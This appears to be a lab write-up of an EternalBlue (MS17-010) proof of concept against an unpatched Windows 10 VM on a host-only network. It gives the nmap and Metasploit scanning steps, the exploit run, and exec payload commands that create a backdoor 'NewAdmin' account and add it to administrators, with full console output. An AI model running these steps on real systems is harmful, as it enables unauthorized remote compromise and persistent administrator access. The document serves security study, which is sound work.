# EternalBlue POC

## Setup

Latest Win10 VM from [here](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/):
Password (qwerty/azerty) : Pqsszàrd1/Passw0rd!

*This VM is patched against smb-vuln-ms17-010.*

---

Use a vulnerable Windows 10 Pro 10240 x64 ISO to create the VM.

**VirtualBox Network setup** : 
File>Gestionnaire de réseau hôte>Create a new host-only network
Network>Réseau privé hôte

**Guest** :
Search 'Windows features' and activate SMBv1.
Open file explorer, select network and activate the network discovery.
Use `ipconfig` to get the guest IP.

## Scan

Check for vulnerabilities with `nmap`.

- `-O`: OS discovery,
- `-sV`: determine service/version info on open ports,
- `-sC`: default script scan,

```bash
> nmap -Pn -n -sV --script vuln 192.168.56.102
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-01 11:39 CET
Nmap scan report for 192.168.56.102
Host is up (0.0037s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DESKTOP-GIK88U0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.22 seconds
```

```bash
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set rhosts
set rhosts  
msf6 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.56.102
rhosts => 192.168.56.102
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.56.102:445    - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (uptime:13m 20s) (guid:{82aa542f-6812-4228-9f14-30fbf59f0ab1}) (authentication domain:WIN-DO0J5EDLGLU)
[+] 192.168.56.102:445    -   Host is running Windows 10 Pro (build:10240) (name:WIN-DO0J5EDLGLU) (workgroup:WORKGROUP)
[*] 192.168.56.102:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Exploitation

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue                  
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.56.102
rhosts => 192.168.56.102
msf6 exploit(windows/smb/ms17_010_eternalblue) > set SMBPass password
SMBPass => password
msf6 exploit(windows/smb/ms17_010_eternalblue) > set SMBUser Test
SMBUser => Test
# no shell with windows/x64/meterpreter/reverse_tcp, create a new SMB user instead
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/exec
payload => windows/x64/exec
msf6 exploit(windows/smb/ms17_010_eternalblue) > set cmd net user /add NewAdmin root
cmd => net user /add NewAdmin root

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.0.21:4444 
[*] 192.168.56.102:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.56.102:445    - Host is likely VULNERABLE to MS17-010! - Windows 10 Pro 10240 x64 (64-bit)
[*] 192.168.56.102:445    - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.56.102:445 - The target is vulnerable.
[*] 192.168.56.102:445 - shellcode size: 1283
[*] 192.168.56.102:445 - numGroomConn: 12
[*] 192.168.56.102:445 - Target OS: Windows 10 Pro 10240
[+] 192.168.56.102:445 - got good NT Trans response
[+] 192.168.56.102:445 - got good NT Trans response
[+] 192.168.56.102:445 - SMB1 session setup allocate nonpaged pool success
[+] 192.168.56.102:445 - SMB1 session setup allocate nonpaged pool success
[+] 192.168.56.102:445 - good response status for nx: INVALID_PARAMETER
[+] 192.168.56.102:445 - good response status for nx: INVALID_PARAMETER
[*] Exploit completed, but no session was created.
# Check that the new SMB user was created
msf6 exploit(windows/smb/ms17_010_eternalblue) > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 192.168.56.102
rhosts => 192.168.56.102
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser NewAdmin
SMBUser => NewAdmin
msf6 auxiliary(scanner/smb/smb_login) > set SMBPass root
SMBPass => root
msf6 auxiliary(scanner/smb/smb_login) > run
[*] 192.168.56.102:445    - 192.168.56.102:445 - Starting SMB login bruteforce
[+] 192.168.56.102:445    - 192.168.56.102:445 - Success: '.\NewAdmin:root'
[*] 192.168.56.102:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
# Escalate privilege on our new user
msf6 exploit(windows/smb/ms17_010_eternalblue) > set cmd net localgroup /add administrators NewAdmin 
cmd => net localgroup /add administrators NewAdmin
```

- [Windows 10 exploit informations](https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/eternalblue_exploit10.py)
- [Adjust the remote UAC](https://github.com/SecureAuthCorp/impacket/issues/481#issuecomment-411884539)
- [EternalBlue writeup](https://redteamzone.com/EternalBlue/)
- [SMB remote connection](https://www.hackingarticles.in/multiple-ways-to-connect-remote-pc-using-smb-port/)
- [Manual exploitation](https://root4loot.com/post/eternalblue_manual_exploit/)
